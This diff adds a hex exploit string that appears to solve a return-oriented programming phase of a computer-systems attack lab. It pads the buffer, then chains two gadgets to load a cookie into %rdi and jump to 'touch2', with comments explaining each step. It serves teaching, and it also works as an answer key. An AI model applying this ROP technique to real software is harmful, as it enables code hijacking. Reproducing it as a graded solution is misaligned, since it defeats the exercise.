@@ -1,0 +1,24 @@
+01 01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01
+
+/* from `addval_219`, get `58 90 c3`, which is the following instruction sequence: */
+/* - `popq %rax` */
+/* - `nop` */
+/* - `ret` */
+ab 19 40 00 00 00 00 00
+
+/* the value for cookie */
+fa 97 b9 59 00 00 00 00
+
+/* from `addval_273`, get `48 89 c7 c3`, which is the following instruction sequence: */
+/* - `movq %rax, %rdi` */
+/* - `ret` */
+a2 19 40 00 00 00 00 00
+
+/* address of `touch2` */
+ec 17 40 00 00 00 00 00
+
+0a
